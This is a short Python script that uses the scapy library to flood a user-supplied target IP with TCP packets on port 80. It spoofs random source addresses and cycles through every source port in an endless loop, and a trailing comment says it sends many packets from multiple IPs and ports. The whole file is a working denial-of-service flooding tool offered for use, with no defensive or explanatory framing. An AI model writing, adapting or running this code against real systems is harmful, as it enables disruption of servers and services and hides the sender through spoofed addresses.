from scapy.all import *
import random

target_IP = input("Enter IP address of Target: ")
i = 1

while True:
    a = str(random.randint(1,254))
    b = str(random.randint(1,254))
    c = str(random.randint(1,254))
    d = str(random.randint(1,254))
    dot = '.'
    Source_ip = a + dot + b + dot + c + dot + d
   
    for source_port in range(1, 65535):
        IP1 = IP(src= Source_ip, dst = target_IP)
        TCP1 = TCP(sport = source_port, dport = 80) # Port 80 is for HTTP
        pkt = IP1 / TCP1
        send(pkt,inter = .001)
        
        print("packet sent ", i)
        i = i + 1
            
# It will then send a large number of packets 
# to the server from multiple IP and from multiple ports
